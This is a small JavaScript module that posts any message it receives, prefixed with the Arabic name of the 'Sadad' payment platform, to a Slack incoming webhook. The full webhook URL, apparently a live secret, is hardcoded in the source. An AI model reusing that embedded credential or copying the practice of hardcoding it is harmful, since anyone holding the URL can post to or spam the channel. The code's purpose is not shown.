import axios from 'axios';

export const TeleSned = () => {
    const Send = async (message) => {
        const webhookUrl = 'https://hooks.slack.com/services/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';
        const data = { text: `منصة سداد \n ${message}` }; // Properly format the payload

        try {
            await axios.post(webhookUrl, data); // Send the POST request
            console.log('Message sent successfully');
        } catch (error) {
            console.error('Error sending message:', error);
        }
    };

    return { Send };
};

export default TeleSned;
